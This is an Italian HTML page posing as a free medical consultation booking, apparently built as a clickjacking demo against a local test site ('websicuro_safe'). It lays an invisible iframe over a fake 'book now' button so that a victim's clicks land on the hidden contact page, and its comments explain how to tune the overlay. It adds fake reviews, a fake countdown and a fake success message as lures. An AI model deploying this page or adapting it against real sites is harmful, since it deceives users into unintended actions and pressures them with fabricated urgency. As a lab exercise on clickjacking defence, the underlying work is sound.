<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <title>Consulenza Medica Gratuita</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f7fb;
            color: #333;
            padding: 40px 20px;
            text-align: center;
        }

        h1 {
            color: #2a7ae2;
        }

        .clickjack-container {
            position: relative;
            width: 350px;
            height: 120px;
            margin: 30px auto;
            overflow: hidden;
        }

        .clickjack-container iframe {
            position: absolute;
            /* sostituisci -870px con il valore misurato in DevTools */
            top: -870px;
            left: 50%;
            transform: translateX(-50%);
            width: 1400px;
            height: 1200px;
            opacity: 0;            /* iframe invisibile ma cliccabile */
            border: none;
            z-index: 2;
            pointer-events: auto;    /* l’iframe DEVE ricevere il click */
        }

        .clickjack-container .fake-button {
            position: absolute;
            top: 0;
            left: 0;
            width: 350px;
            height: 120px;
            background-color: #dc3545;
            color: white;
            font-size: 20px;
            font-weight: bold;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1;             /* sotto l’iframe in termini di eventi */
            pointer-events: none;   /* layer trasparente ai click */
        }

        .reviews,
        .countdown,
        .loader,
        .success-message {
            max-width: 600px;
            margin: 30px auto;
        }

        .review {
            background-color: #ffffff;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 15px;
            text-align: left;
            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
        }

        .review strong {
            color: #007bff;
        }

        .loader {
            font-size: 16px;
            color: #555;
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.4; }
            100% { opacity: 1; }
        }

        .countdown {
            font-size: 18px;
            font-weight: bold;
            color: #e63946;
        }

        .success-message {
            display: none;
            margin-top: 40px;
            padding: 20px;
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
            border-radius: 8px;
        }
    </style>
</head>
<body>
    <h1>🎁 Prenota ora la tua consulenza medica gratuita</h1>
    <p>Un medico è disponibile per pochi minuti! Prenota ora per evitare l'attesa.</p>

    <!-- Conto alla rovescia -->
    <div class="countdown" id="countdown">⏳ Offerta valida per altri: 03:00</div>

    <!-- Area Clickjacking -->
    <div class="clickjack-container">
        <iframe id="cjFrame" src="http://localhost/websicuro_safe/views/contatti.php"></iframe>
        <div class="fake-button">Prenota ora la consulenza</div>
    </div>

    <!-- Messaggio di successo -->
    <div class="success-message" id="successMsg">
        ✅ Prenotazione completata! Verrai ricontattato entro pochi minuti.
    </div>

    <!-- Loader finto -->
    <div class="loader">🔍 Verifica disponibilità del medico...</div>

    <!-- Recensioni utente -->
    <div class="reviews">
        <div class="review"><strong>Laura M.</strong>: “Medico gentilissimo, ho risolto tutto in pochi minuti!”</div>
        <div class="review"><strong>Gianluca F.</strong>: “Prenotazione velocissima, ottimo servizio.”</div>
        <div class="review"><strong>Valeria T.</strong>: “Lo consiglio a chiunque abbia bisogno!”</div>
    </div>

    <!-- Script -->
    <script>
        // Countdown finto
        let time = 180; // 3 minuti
        const countdownEl = document.getElementById("countdown");
        function updateCountdown() {
            const minutes = Math.floor(time / 60);
            const seconds = time % 60;
            countdownEl.textContent = `⏳ Offerta valida per altri: ${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
            if (time > 0) {
                time--;
                setTimeout(updateCountdown, 1000);
            }
        }
        updateCountdown();
</script>
</body>
</html>
